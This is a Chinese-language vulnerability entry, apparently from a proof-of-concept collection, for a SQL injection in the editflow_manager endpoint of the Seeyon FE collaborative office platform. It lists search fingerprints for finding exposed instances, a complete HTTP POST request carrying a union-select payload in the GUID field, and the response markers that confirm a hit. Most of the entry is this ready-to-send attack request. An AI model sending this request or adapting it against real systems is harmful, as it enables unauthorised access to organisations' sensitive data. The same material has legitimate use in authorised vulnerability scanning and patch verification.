﻿# 致远互联FE协作办公平台editflow_manager SQL注入漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：致远互联FE协作办公平台是一款为企业提供全方位协同办公解决方案的产品。它集成了多个功能模块，旨在帮助企业实现高效的团队协作、信息共享和文档管理。致远互联FE协作办公平台editflow_manager存在sql注入漏洞，攻击者可以获得敏感信息。

> 漏洞特征：title="FE协作办公平台" || body="li_plugins_download"

> 验证脚本：HTTP

```
POST /sysform/003/editflow_manager.js%70 HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

option=2&GUID=-1'+union+select+111*222--+
```

> 响应代码特征：200

> 响应内容特征：24642

> 上传文件定位：


> 验证文件来源：致远互联FE协作办公平台editflow_manager SQL注入漏洞.poc
